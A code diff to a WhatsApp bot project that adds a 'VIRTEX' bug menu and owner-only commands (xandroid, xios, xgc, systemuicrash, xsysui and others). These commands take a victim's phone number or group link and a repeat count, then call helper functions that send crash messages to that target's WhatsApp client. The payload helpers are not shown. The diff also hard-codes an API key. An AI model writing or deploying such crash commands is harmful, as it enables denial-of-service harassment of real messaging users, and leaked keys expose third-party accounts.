@@ -2344,6 +2344,15 @@ break;
 ┃✺ ${prefix}roulette
 ┃✺ ${prefix}blackjack
 ┃✺ ${prefix}compliment
+┗━━━━━━━━━━━━━━━⊛
+┏━⍟ *VIRTEX* ⍟
+┃✺ ${prefix}xandroid
+┃✺ ${prefix}xandroid2
+┃✺ ${prefix}xios
+┃✺ ${prefix}xios2
+┃✺ ${prefix}xsysui
+┃✺ ${prefix}xgc
+┃✺ ${prefix}systemuicrash 
 ┗━━━━━━━━━━━━━━━⊛`
 
   let menumsg = generateWAMessageFromContent(from, {
@@ -2503,7 +2512,7 @@ case 'public': {
         if (!isNsfw) return reply(mess.nsfw);
         if (!m.isGroup) return reply(mess.group);
         
-        const nsfwmenu=`┏━⍟ *🔞NSFW🔞* ⍟
+        const nsfwmenu=`┏━⍟ *NSFW* ⍟
 ┃✺ ${prefix}blowjob
 ┃✺ ${prefix}cum
 ┃✺ ${prefix}foot
@@ -2531,7 +2540,7 @@ case 'public': {
 ////////////////////menu_v2.1///////////////////////
    
 case 'generalmenu':
-    const generalmenu = `┏━⍟ *🧧GENERAL🧧* ⍟
+    const generalmenu = `┏━⍟ *GENERAL* ⍟
 ┃✺ ${prefix}toge
 ┃✺ ${prefix}dev
 ┃✺ ${prefix}info
@@ -3244,7 +3253,7 @@ await Maria.relayMessage(snamsg.key.remoteJid,  snamsg.message, {
     
     
   case 'othersmenu':
-    const othersmenu = `┏━⍟*⛩️OTHERS⛩️*⍟
+    const othersmenu = `┏━⍟ *OTHERS* ⍟
 ┃✺ ${prefix}sticker
 ┃✺ ${prefix}qc
 ┃✺ ${prefix}smeme
@@ -3270,7 +3279,7 @@ await Maria.relayMessage(snamsg.key.remoteJid,  snamsg.message, {
 ┃✺ ${prefix}obfuscate
 ┗━━━━━━━━━━━━━━━⊛
 `
-let othmsg = generateWAMessageFromContent(from, {
+    let othmsg = generateWAMessageFromContent(from, {
   viewOnceMessage: {
     message: {
         "messageContextInfo": {
@@ -3346,7 +3355,7 @@ await Maria.relayMessage(othmsg.key.remoteJid, othmsg.message, {
 ┃✺ ${prefix}compliment
 ┗━━━━━━━━━━━━━━━⊛
 `
-    let gamemsg = generateWAMessageFromContent(from, {
+let gamemsg = generateWAMessageFromContent(from, {
   viewOnceMessage: {
     message: {
         "messageContextInfo": {
@@ -3410,16 +3419,18 @@ await Maria.relayMessage(gamemsg.key.remoteJid, gamemsg.message, {
 			    
     
 case 'bugmenu':
-const gamesmenu = `┏━⍟ *VIRTEX* ⍟
+  const gamesmenu = `┏━⍟ *VIRTEX* ⍟
 ┃✺ ${prefix}xandroid
 ┃✺ ${prefix}xandroid2 
 ┃✺ ${prefix}xios
 ┃✺ ${prefix}xios2
+┃✺ ${prefix}xsysui
 ┃✺ ${prefix}xgc
 ┃✺ ${prefix}systemuicrash 
 ┗━━━━━━━━━━━━━━━⊛
- `   
-Message: {
+ `
+     let gamemsg = generateWAMessageFromContent(from, {
+   viewOnceMessage: {
     message: {
         "messageContextInfo": {
           "deviceListMetadata": {},
@@ -3434,7 +3445,7 @@ Message: {
           }),
                     header: proto.Message.InteractiveMessage.Header.create({
                 ...(await prepareWAMessageMedia({ image : fs.readFileSync(randomImage)}, { upload: Maria.waUploadToServer})), 
-            title: gamesmenu,
+            title: bugmenu,
             subtitle: themeemoji,
             hasMediaAttachment: false
           }),
@@ -3475,13 +3486,13 @@ Message: {
   }
 }, {})
 
-await Maria.relayMessage(gamemsg.key.remoteJid, gamemsg.message, {
-  messageId: gamemsg.key.id
+await Maria.relayMessage(bugmsg.key.remoteJid, bugmsg.message, {
+  messageId: bugmsg.key.id
 })
  break
 	    
-		    
-  case 'alive': {
+
+case 'alive': {
   const alivem = `┏━━━━❮ 𝚫𝐋𝚰𝛁𝚵 ❯━━━━━᯽
 ┃ *🤖 Bot Name:* ${botname}
 ┃ *👨‍✈️ Creator:* ${ownername}
@@ -3637,6 +3648,10 @@ let liistmsg = generateWAMessageFromContent(from, {
    {
   "name": "quick_reply",
   "buttonParamsJson": `{"display_text":"⛩️OTHERS⛩️","id":"${prefix}othersmenu"}`
+   },
+   {
+  "name": "quick_reply",
+  "buttonParamsJson": `{"display_text":"👾VIRTEX👾","id":"${prefix}bugmenu"}`
    },
    {
   "name": "quick_reply",
@@ -3849,7 +3864,7 @@ break;
 if (args[0] === "on") {
 if (AntiNsfw) return reply('Already activated✅️')
 isnsfw.push(from)
-fs.writeFileSync('./Media/database/nsfw.json', JSON.stringify(isnsfw))
+fs.writeFileSync('./database/nsfw.json', JSON.stringify(isnsfw))
 reply('Successfully activating nsfw mode in this group ✔️')
 var groupe = await Maria.groupMetadata(from)
 var members = groupe['participants']
@@ -3862,7 +3877,7 @@ Maria.sendMessage(from, {text:  `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw
 if (!AntiNsfw) return reply('Already deactivated')
 let off = isnsfw.indexOf(from)
 isnsfw.splice(off, 1)
-fs.writeFileSync('./Media/database/nsfw.json', JSON.stringify(isnsfw))
+fs.writeFileSync('./database/nsfw.json', JSON.stringify(isnsfw))
 reply('Successfully deactivating nsfw mode in this group ✔️')
 } else {
   await reply(`*Kindly input the choice as follows:*
@@ -4146,7 +4161,7 @@ case 'zero-two': {
 			if (!quoted) return reply(`Where is the picture?`)
 			if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)
 			reply(mess.wait)
-			const { remini } = require('./Media/lib/remini')
+			const { remini } = require('./lib/remini')
 			let media = await quoted.download()
 			let proses = await remini(media, "enhance")
 			Maria.sendMessage(m.chat, { image: proses, caption: mess.done}, { quoted: m})
@@ -4203,7 +4218,7 @@ case 'hidetag': {
       case 'img': {
       if (!args.join(" ")) return reply(`🧩${pushname}Please provide a search term!`);
         reply(mess.waiting)
-        let { pinterest } = require('./Gallery/lib/scraper');
+        let { pinterest } = require('./lib/scraper');
         let anutrest = await pinterest(text);
         let results = [];
 
@@ -4399,7 +4414,7 @@ case 'welcome':
 
 
 case 'git': case 'gitclone':
-if (!text) return reply(`🧩Where is the link?\n🔮Example :\n${prefix}${command} https://github.com/toge012345/TOGE-MD-V3 `)
+if (!text) return reply(`🧩Where is the link?\nExample :\n${prefix}${command} https://github.com/toge012345/TOGE-MD-V3 `)
 if (!isUrl(text) && !text.includes('github.com')) return reply(`Link invalid!!`)
     let repo = text.split('/');
     let url = `https://api.github.com/repos/${repo[3]}/${repo[4]}/zipball`
@@ -4423,7 +4438,7 @@ case 'telestick': case 'tgs':{
 				Maria.sendMessage(m.chat, { sticker: { url: mariaresources[i].url }})
 			}
 		}
-	} else reply(`🧩Telegram sticker Link??\n🔮Example. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
+	} else reply(`Telegram sticker Link??\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
 }
 break;
 
@@ -4455,7 +4470,7 @@ case 'naturetypography':
 case 'quotesunder':
 case 'shinetext':{
 
-if (!q) return reply(`🔮Example : ${prefix+command} toge`) 
+if (!q) return reply(`Example : ${prefix+command} toge`) 
 let link
 if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
 if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
@@ -4577,10 +4592,7 @@ case 'ping':
   case 'mods':
 case 'developer':
 case 'dev':
-    const devmod = `  🍥 *Moderators* 🍥\n\n
-*🎫TOGE INUMAKI* @24105114159
-\n
-\n📛*Don't Spam them to avoid Blocking !*\n\n For any help, type *${prefix}support* and ask in the group.\n\n*✨️Thanks for using TOGE-MD-V3* `;
+    const devmod = `  𝚑𝚒 𝚖𝚢 𝚍𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛 𝚒𝚜 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚑𝚎𝚛𝚎 𝚊𝚛𝚎 𝚝𝚑𝚎𝚒𝚛 𝚗𝚞𝚖𝚋𝚎𝚛𝚜 @24105114159`;
 
     Maria.sendMessage(m.chat, { text: devmod, mentions: ["24105114159@s.whatsapp.net", "24105114159@s.whatsapp.net", "24105114159@s.whatsapp.net","24102150169@s.whatsapp.net"] }, { quoted: m });
     break;
@@ -4967,15 +4979,15 @@ async function fetchRandomScienceFact() {
 			    
 //bug cases
 case "xandroid": {
-  if (!isCreator) return replay(mess.botowner);
-  if (!text) return replay(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
+  if (!isCreator) return reply(mess.owner);
+  if (!text) return reply(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
   let number = text.split(',')[0];
   let amount = text.split(',')[1] * 5;
   if (!number || !amount) {
-    return replay(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
+    return reply(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
   }
   if (isNaN(parseInt(amount))) {
-    return replay("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
+    return reply("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
   }
   let cleanedNumber = number.replace(/[^0-9]/g, '');
   let encodedAmount = '' + encodeURI(amount);
@@ -4985,9 +4997,9 @@ case "xandroid": {
     return;
   }
   if (contactInfo.length == 0) {
-    return replay("𝕿𝖍𝖊 𝖓𝖚𝖒𝖇𝖊𝖗 𝖎𝖘 𝖓𝖔𝖙 𝖗𝖊𝖌𝖎𝖘𝖙𝖊𝖗𝖊𝖉 𝖔𝖓 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕");
+    return reply("𝕿𝖍𝖊 𝖓𝖚𝖒𝖇𝖊𝖗 𝖎𝖘 𝖓𝖔𝖙 𝖗𝖊𝖌𝖎𝖘𝖙𝖊𝖗𝖊𝖉 𝖔𝖓 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕");
   }
-  replay("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
+  reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
   await sleep(2000); // Adjusted sleep time for clarity
   sendVariousMessages(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
@@ -4999,15 +5011,15 @@ case "xandroid": {
 }
 break;
 case "xios": {
-  if (!isCreator) return replay(mess.botowner);
-  if (!text) return replay(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
+  if (!isCreator) return reply(mess.owner);
+  if (!text) return reply(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
   let number = text.split(',')[0];
   let amount = text.split(',')[1] * 5;
   if (!number || !amount) {
-    return replay(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
+    return reply(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
   }
   if (isNaN(parseInt(amount))) {
-    return replay("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
+    return reply("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
   }
   let cleanedNumber = number.replace(/[^0-9]/g, '');
   let encodedAmount = '' + encodeURI(amount);
@@ -5017,9 +5029,9 @@ case "xios": {
     return;
   }
   if (contactInfo.length == 0) {
-    return replay("𝕿𝖍𝖊 𝖓𝖚𝖒𝖇𝖊𝖗 𝖎𝖘 𝖓𝖔𝖙 𝖗𝖊𝖌𝖎𝖘𝖙𝖊𝖗𝖊𝖉 𝖔𝖓 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕");
+    return reply("𝕿𝖍𝖊 𝖓𝖚𝖒𝖇𝖊𝖗 𝖎𝖘 𝖓𝖔𝖙 𝖗𝖊𝖌𝖎𝖘𝖙𝖊𝖗𝖊𝖉 𝖔𝖓 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕");
   }
-  replay("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
+  reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
   await sleep(2000); // Adjusted sleep time for clarity
   sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
@@ -5029,18 +5041,19 @@ case "xios": {
     [whatsappNumber]
   );
 }
-break;
+break
+	
 case "xios2":
   {
-	if (!isCreator) return replay(mess.botowner);
+	if (!isCreator) return reply(mess.owner);
     if (!isBot) {
-      return replay("𝕿𝖍𝖎𝖘 𝖋𝖊𝖆𝖙𝖚𝖗𝖊 𝖎𝖘 𝖋𝖔𝖗 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖔𝖓𝖑𝖞");
+      return reply("𝕿𝖍𝖎𝖘 𝖋𝖊𝖆𝖙𝖚𝖗𝖊 𝖎𝖘 𝖋𝖔𝖗 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖔𝖓𝖑𝖞");
     }
     if (!text){
-      return replay(`𝕰𝖝𝖆𝖒𝖕𝖑𝖊 𝖚𝖘𝖆𝖌𝖊: ${prefix + command} 5`)
+      return reply(`𝕰𝖝𝖆𝖒𝖕𝖑𝖊 𝖚𝖘𝖆𝖌𝖊: ${prefix + command} 5`)
       }
     if (isNaN(parseInt(text))) {
-      return replay("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
+      return reply("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
     }
     let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
     replay("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
@@ -5049,18 +5062,19 @@ case "xios2":
     await sleep(2500); // Adjusted sleep time for clarity
     sendReaction('✅');
   }
-  break;
+  break
+	
   case "xandroid2":
   {
-	if (!isCreator) return replay(mess.botowner);
+	if (!isCreator) return reply(mess.owner);
     if (!isBot) {
-      return replay("𝕿𝖍𝖎𝖘 𝖋𝖊𝖆𝖙𝖚𝖗𝖊 𝖎𝖘 𝖋𝖔𝖗 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖔𝖓𝖑𝖞");
+      return reply("𝕿𝖍𝖎𝖘 𝖋𝖊𝖆𝖙𝖚𝖗𝖊 𝖎𝖘 𝖋𝖔𝖗 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖔𝖓𝖑𝖞");
     }
     if (!text){
-      return replay(`𝕰𝖝𝖆𝖒𝖕𝖑𝖊 𝖚𝖘𝖆𝖌𝖊: ${prefix + command} 5`)
+      return reply(`𝕰𝖝𝖆𝖒𝖕𝖑𝖊 𝖚𝖘𝖆𝖌𝖊: ${prefix + command} 5`)
       }
     if (isNaN(parseInt(text))) {
-      return replay("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
+      return reply("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
     }
     let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
     replay("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
@@ -5069,16 +5083,16 @@ case "xios2":
     await sleep(2500); // Adjusted sleep time for clarity
     sendReaction('✅');
   }
-  break;
-  case "xgc":
-  {
-    if (!isCreator) return replay(mess.botowner);
+  break
+	
+  case "xgc": {
+    if (!isCreator) return reply(mess.owner)
     if (!text) {
-      return replay("𝙷𝙾𝚆 𝚃𝙾 𝚂𝙴𝙽𝙳 𝙱𝚄𝙶 𝚃𝙾 𝙶𝚁𝙾𝚄𝙿\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
+      return reply("𝙷𝙾𝚆 𝚃𝙾 𝚂𝙴𝙽𝙳 𝙱𝚄𝙶 𝚃𝙾 𝙶𝚁𝙾𝚄𝙿\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
     }
-    replay("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
+    reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
     if (!text.split(" ")[0].includes("whatsapp.com")) {
-      return replay("𝕷𝖎𝖓𝖐 𝕴𝖓𝖛𝖆𝖑𝖎𝖉");
+      return reply("𝕷𝖎𝖓𝖐 𝕴𝖓𝖛𝖆𝖑𝖎𝖉");
     }
     let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
     try {
@@ -5087,35 +5101,36 @@ case "xios2":
       await sleep(2000); // Adjusted sleep time for clarity
       sendViewOnceMessages(groupTarget, bugAmount);
       await sleep(2500); // Adjusted sleep time for clarity
-      replay("𝙷𝙾𝚆 𝚃𝙾 𝚂𝙴𝙽𝙳 𝙱𝚄𝙶 𝚃𝙾 𝙶𝚁𝙾𝚄𝙿");
+      reply("𝙷𝙾𝚆 𝚃𝙾 𝚂𝙴𝙽𝙳 𝙱𝚄𝙶 𝚃𝙾 𝙶𝚁𝙾𝚄𝙿");
       XeonBotInc.groupLeave(groupTarget);
     } catch (error) {
-      replay(util.format(error));
+      reply(util.format(error));
     }
   }
-  break;
+  break
+	
   case "systemuicrash": {
-  if (!isCreator) return replay(mess.botowner);
-  if (!text) return replay(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
+  if (!isCreator) return reply(mess.owner);
+  if (!text) return reply(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
   let number = text.split(',')[0];
   let amount = text.split(',')[1] * 5;
   if (!number || !amount) {
-    return replay(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxx,5`) 
+    return reply(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxx,5`) 
   }
   if (isNaN(parseInt(amount))) {
-    return replay("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
+    return reply("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
   }
   let cleanedNumber = number.replace(/[^0-9]/g, '');
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
   if (cleanedNumber == "24105114159") {
-    return;
+    return
   }
   if (contactInfo.length == 0) {
-    return replay("𝕿𝖍𝖊 𝖓𝖚𝖒𝖇𝖊𝖗 𝖎𝖘 𝖓𝖔𝖙 𝖗𝖊𝖌𝖎𝖘𝖙𝖊𝖗𝖊𝖉 𝖔𝖓 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕");
+    return reply("𝕿𝖍𝖊 𝖓𝖚𝖒𝖇𝖊𝖗 𝖎𝖘 𝖓𝖔𝖙 𝖗𝖊𝖌𝖎𝖘𝖙𝖊𝖗𝖊𝖉 𝖔𝖓 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕");
   }
-  replay("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
+  reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
   await sleep(2000); // Adjusted sleep time for clarity
   sendMixedMessages(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
@@ -5125,14 +5140,15 @@ case "xios2":
     [whatsappNumber]
   );
 }
-break;
+break
+
 case "xsysui": {
-  if (!isCreator) return replay(mess.botowner);
-  if (!text) return replay(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
+  if (!isCreator) return reply(mess.owner);
+  if (!text) return reply(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
   let number = text.split(',')[0];
   let amount = text.split(',')[1] * 5;
   if (!number || !amount) {
-    return replay(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
+    return reply(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
   }
   if (isNaN(parseInt(amount))) {
     return replay("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
@@ -5145,9 +5161,9 @@ case "xsysui": {
     return;
   }
   if (contactInfo.length == 0) {
-    return replay("𝕿𝖍𝖊 𝖓𝖚𝖒𝖇𝖊𝖗 𝖎𝖘 𝖓𝖔𝖙 𝖗𝖊𝖌𝖎𝖘𝖙𝖊𝖗𝖊𝖉 𝖔𝖓 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕");
+    return reply("𝕿𝖍𝖊 𝖓𝖚𝖒𝖇𝖊𝖗 𝖎𝖘 𝖓𝖔𝖙 𝖗𝖊𝖌𝖎𝖘𝖙𝖊𝖗𝖊𝖉 𝖔𝖓 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕");
   }
-  replay("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
+  reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
   await sleep(2000); // Adjusted sleep time for clarity
   sendRepeatedMessages2(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
@@ -5157,15 +5173,14 @@ case "xsysui": {
     [whatsappNumber]
   );
 }
-break;
+break
+	
 case 'clearall': {
-if (!isCreator) return replay(mess.botowner);
+if (!isCreator) return replay(mess.owner);
 XeonBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
 }
-break
-case 'clearchat':
-xeonimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
-break
+break;
+		
 // Function to fetch the latest science news headlines using the News API
 async function fetchScienceNewsHeadlines() {
     const apiKey = 'bf17483564e24e2aa83ff6dc6a8e79eb'; // Provided News API key
@@ -5227,12 +5242,8 @@ case "info":
 ❁ ═══ ❃•📕 *INFORMATION*📕•❃ ═══ ❁
 \`\`\`A simple and easy-to-use WhatsApp bot project based on Multi-Device Baileys and written in JavaScript\`\`\`
 
-❁ ══════ ❃•📄 *NOTE* 📄•❃ ══════ ❁
-\`\`\`This bot is a free open source project by THE TEAM AYUSH\`\`\`
-
 ❁ ═════ ❃•📑 *GITHUB* 📑•❃ ═════ ❁
-*_LINK:- https://github.com/AYUSH-PANDEY023/Maria-MD_*
-
+*_LINK:- https://github.com/toge012345/TOGE-MD-V3_*
 
 ❁ ═══ ❃•✍🏻 *CONTRIBUTE* ✍🏻•❃ ═══ ❁
 \`\`\`Feel free to open issues regarding any problems or if you have any feature feel free to contact owner by typing ${prefix}owner or ${prefix}mods`
@@ -5265,7 +5276,7 @@ _If you have any questions regarding our terms, please reach out to us._
 _For everything else, use common sense._
 
 *FUTURE IS NOW🚀~TOGE-MD-V3*
-*_🚀Team TOGE-BOT_*
+*_🚀TOGE-BOT_*
 
 ⍟ *────────────────* ⍟`
  let mariajpg= "https://telegra.ph/file/5c831c160ad93ad5c1bc7.jpg" 
